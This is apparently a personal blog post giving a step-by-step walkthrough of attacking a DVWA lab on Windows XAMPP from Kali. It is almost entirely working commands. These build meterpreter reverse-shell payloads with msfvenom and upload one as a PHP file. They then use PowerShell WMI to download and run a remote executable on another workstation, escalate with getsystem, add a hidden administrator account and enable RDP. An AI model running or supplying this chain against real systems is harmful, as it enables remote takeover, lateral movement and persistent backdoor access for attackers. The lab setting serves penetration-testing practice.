---
title: 'kali Windows PHP Attack'
author: RichMason
layout: post
permalink: /kali-php/
categories:
  - Tech
---
Install xampp from https://www.apachefriends.org/download.html

Download dvwa from https://github.com/digininja/DVWA

Extract DVWAmaster.zip to c:\xampp\htdocs\dvwa

Rename C:\xampp\htdocs\dvwa\config\config.inc.php.data to remove the last extension

Edit the file as

$_DVWA[ 'db_user' ]     = 'root';
$_DVWA[ 'db_password' ] = '';


Start using xampp console apache and mysql.

Browse to http://127.0.0.1/login.php

Login as admin/password

Create the database and set level to low

Create php file to exploit

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.200.203 LPORT=4444 -f raw > reverse.php
```

Upload the php file to the website using the dvwa upload file tab

Browse to http://<dvwa_site>:82/dvwa/hackable/uploads/reverse.php to open the tunnel


How to exploit XAMPP with php and then download exe to exploit getsystem.

On Kali console run

```bash
nc -nlvp 4444
```

Browse to http://<dvwa_server>:82/dvwa/hackable/uploads/reverse.php to open the tunnel

Create exe file to exploit

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.200.203 LPORT=4445 -f exe > reverse.exe
```

```bash
msfconsole

use exploit/multi/handler

set payload windows/x64/meterpreter/reverse_tcp

set lhost 192.168.200.203

set lport 4445
```


Via the first shell opened onto dvwa run

```powershell
powershell Invoke-WmiMethod -Computer 192.168.200.15 -Path win32_process -Name create -ArgumentList 'powershell.exe -command "Invoke-WebRequest -Uri http://192.168.200.10/tunnel.exe -OutFile "c:\cb\dotnetfx.exe"'
```

  then


```powershell
powershell Invoke-WmiMethod -Computer 192.168.200.15 -Path win32_process -Name create -ArgumentList 'powershell.exe -command "Start-Process -Filepath "c:\cb\dotnetfx.exe"'
```

This downloads the exe using powershell on a remote workstation and then executes it starting another reverse tunnel to the second msfconsole session we opened.

On the second tunnel complete the test 

```bash
getsystem

net user /add ricky Bru73f0rc3_

net localgroup administrators ricky /add

reg add “Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server” /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

On the Kali appliance

```bash
apt-get install remmina
```

Connect over rdp to demonstarte access via the user created.
